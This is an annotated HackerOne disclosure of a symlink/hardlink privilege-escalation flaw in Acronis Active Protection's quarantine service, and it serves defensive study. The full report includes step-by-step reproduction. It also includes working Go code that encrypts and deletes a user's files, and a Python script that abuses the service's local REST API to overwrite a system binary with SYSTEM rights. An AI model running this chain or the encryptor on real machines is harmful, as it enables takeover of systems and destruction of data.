# Local Privilege Escalation in anti_ransomware_service.exe via Quarantine Symlink Attack

## Metadata
- **Source:** HackerOne
- **Report:** 858598 | https://hackerone.com/reports/858598
- **Submitted:** 2020-04-24
- **Reporter:** mjoensen
- **Program:** Acronis Active Protection
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Privilege Escalation, Symlink/Hardlink Attack, Arbitrary File Write, Insecure File Operations, TOCTOU (Time-of-Check-Time-of-Use)
- **CVEs:** None
- **Category:** auth-crypto

## Summary
The anti_ransomware_service.exe quarantine functionality performs privileged file operations without properly validating the target path, allowing an unprivileged user to create symlinks/hardlinks in the world-writable quarantine directory. An attacker can exploit this to overwrite arbitrary system files with SYSTEM privileges, achieving local privilege escalation.

## Attack scenario
1. Attacker creates a malicious executable that simulates ransomware behavior (encrypts files in ProgramData but executes payload when in quarantine directory)
2. Attacker places the malicious executable in C:\ProgramData\ to trigger detection by the antimalware service
3. Attacker creates the quarantine directory path if it doesn't exist (possible due to weak permissions)
4. Attacker manually triggers ransomware detection via the antimalware UI or waits for automatic detection
5. Attacker creates a hardlink/symlink in the quarantine directory pointing to a sensitive system file (e.g., C:\Windows\SysWOW64\dpnsvr.exe)
6. Attacker calls the REST API endpoint to trigger the 'MoveToQuarantine' action, causing the service to copy the malicious file over the system file with SYSTEM privileges

## Root cause
The quarantine feature copies files to a world-writable quarantine directory without validating that the destination path hasn't been modified via symlinks/hardlinks between the time the path was checked and when the file write occurs. The service also fails to properly validate quarantine directory permissions and uses insufficiently restricted file operations that don't account for link attacks.

## Attacker mindset
An attacker with standard user privileges seeks to gain SYSTEM-level access. Recognizing that the antimalware service runs with elevated privileges and performs file operations, the attacker abuses the inherent TOCTOU vulnerability in the quarantine mechanism. By controlling the destination through symlinks in a writable directory, the attacker redirects the privileged write to overwrite critical system files, trivially escalating to SYSTEM.

## Defensive takeaways
- Implement proper symlink/hardlink detection and mitigation: use APIs like CreateFileW with FILE_FLAG_OPEN_REPARSE_POINT to detect and reject symlinks, or use safe file opening flags
- Restrict quarantine directory permissions to SYSTEM-only access; do not allow unprivileged users to write, create links, or modify files in quarantine paths
- Validate that the target path is safe before privileged file operations; use canonical path resolution and verify no symlinks exist in the full path
- Implement atomic file operations or use temporary files with proper validation before moving to final location
- Apply principle of least privilege: if the quarantine feature is optional, disable it by default and require explicit administrative enablement
- Sanitize/validate any user-controlled input that influences file operations, including REST API calls that trigger file moves
- Use Windows Safer File API or similar mechanisms that track file handles through the entire operation to prevent link attacks
- Implement process sandboxing for the quarantine mechanism or run it in a lower privilege context where possible

## Variant hunting
Search for other privileged file copy/move operations in antimalware or system utilities that write to user-accessible directories
Audit all REST API endpoints that trigger file system operations for similar TOCTOU vulnerabilities
Examine other quarantine or isolation mechanisms in competing antimalware products for similar symlink attack vectors
Review all calls to CopyFile, MoveFile, CreateFile with write access that operate in world-writable locations
Check for similar patterns in backup software, file archiving utilities, or system recovery tools that perform privileged file operations

## MITRE ATT&CK
- T1548.004
- T1187
- T1036.006
- T1566
- T1190

## Notes
This vulnerability is particularly dangerous because: (1) the quarantine feature can be triggered remotely via REST API even if not enabled by default, (2) the exploit is highly reliable due to the predictable nature of the quarantine directory structure, (3) arbitrary file write as SYSTEM is trivial to escalate to code execution, and (4) the attack requires no special tools beyond symlink creation utilities (publicly available). The researcher demonstrated excellent proof-of-concept with working code that shows both detection bypass and privilege escalation. The vulnerability highlights the critical importance of validating paths in privileged contexts, especially when user-writable directories are involved.

## Full report
<details><summary>Expand</summary>

anti_ransomware_service.exe includes a functionality to quarantine files which will copy the suspected ransomware file from one directory to another using SYSTEM privileges. As any unprivileged user has write permissions in the quarantine folder, it is possible to control this privileged write with a hardlink. This means that an unprivileged user can write/overwrite arbitrary files in arbitrary folders. Escalating privileges to SYSTEM is trivial with arbitrary writes. While the quarantine feature is not enabled per default, it can be forced to copy the file to the quarantine by communicating with the anti_ransomware_service.exe through its REST api.

Steps to reproduce:
1. Download the symbolic link testing tools by James Forshaw:
    https://github.com/googleprojectzero/symboliclink-testing-tools
2. Copy a program that simulates ransomware to "C:\ProgramData\ransomware_sim.exe". This can contain arbitary payload as long as it simulates ransomware while in its original location and execute the arbitrary payload while in the quarantine location. Example code can be found below. WARNING: The example code does encrypt files, so do not use on any important files!!!
3. Check that "C:\Acronis Active Protection Storage\Quarantine\" exist. If not, create these. This is possible as an unprivileged user.
    mkdir "C:\Acronis Active Protection Storage\Quarantine\"
4. Run "ransomware_sim.exe C:\\Users\\UNPRIVILIEGEDUSER\\"
5. Wait for the ransomware to be detected by Acronis Active Protection. Press block on the Acronis dialog. Do NOT press close on the dialog!
6. Run CreateSymlink.exe "C:\Acronis Active Protection Storage\Quarantine\ProgramData\ransomware_sim.exe" "C:\Windows\SysWOW64\dpnsvr.exe". Keep the command prompt open.
7. Run the python script move_file_to_quarantine.py that moves the file to quarantine. This could of course be written in a compiled language, such that the executable did not need an installed interpreter. Example code can be found below.
8. Verify "C:\Windows\SysWOW64\dpnsvr.exe" have been overwritten with the content of "C:\ProgramData\ransomware_sim.exe"


ransomware_sim.exe:
"""
// THIS CODE WILL ENCRYPT FILES!!! BE WARNED!! COMPILE AND RUN AT OWN RISK!
package main

import (
  "os"
  "io"
  "fmt"
  "strings"
  "io/ioutil"
  "crypto/md5"
  "crypto/aes"
  "crypto/rand"
  "encoding/hex"
  "crypto/cipher"
  "path/filepath"
)

func createHash(key string) string {
  hasher := md5.New()
  hasher.Write([]byte(key))
  return hex.EncodeToString(hasher.Sum(nil))
}

func encryptFiles(path string, info os.FileInfo, err error) error {
  if info.IsDir() {
    return nil
  }
  file, err := os.Open(path)
  if err != nil {
    return nil
  }
  bytes, err := ioutil.ReadAll(file)
  if err != nil {
    panic(err)
  }
  cryptBytes := encrypt(bytes, "password")
  ioutil.WriteFile(path+".crypt", cryptBytes, 0644)
  file.Close()
  err = os.Remove(path)
  if err != nil {
    panic(err)
  }
  return nil
}

func encrypt(data []byte, passphrase string) []byte {
  block, _ := aes.NewCipher([]byte(createHash(passphrase)))
  gcm, err := cipher.NewGCM(block)
  if err != nil {
    panic(err.Error())
  }
  nonce := make([]byte, gcm.NonceSize())
  if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
    panic(err.Error())
  }
  ciphertext := gcm.Seal(nonce, nonce, data, nil)
  return ciphertext
}


func main() {
  dir, _ := os.Getwd()
  if strings.Contains(dir, "ProgramData") {
    filepath.Walk(os.Args[1], encryptFiles)
  } else {
    fmt.Println("Run bad code after being moved by anti_ransomware_service.exe")
  }
}
// THIS CODE WILL ENCRYPT FILES!!! BE WARNED!! COMPILE AND RUN AT OWN RISK!
"""

move_file_to_quarantine.py:
"""
import requests
import json
import time

get_headers = {'User-Agent': 'AcronisRestClient', "Accept": "*/*"}
put_headers = {'User-Agent': 'AcronisRestClient', "Accept": "application/json",
    "Content-Type":"application/json"}

data = {
    "action": "MoveToQuarantine"
}

r1 = requests.get("http://localhost:6109/alerts", headers=get_headers)
alert_id = r1.json()[0]["uniqueId"]
print("Alert ID: {}".format(alert_id))
r2 = requests.post("http://localhost:6109/alerts/"+str(alert_id), headers=put_headers, data=json.dumps(data))
"""

## Impact

Escalate privileges from standard user to SYSTEM.

</details>

---
*Analysed by Claude on 2026-05-24*
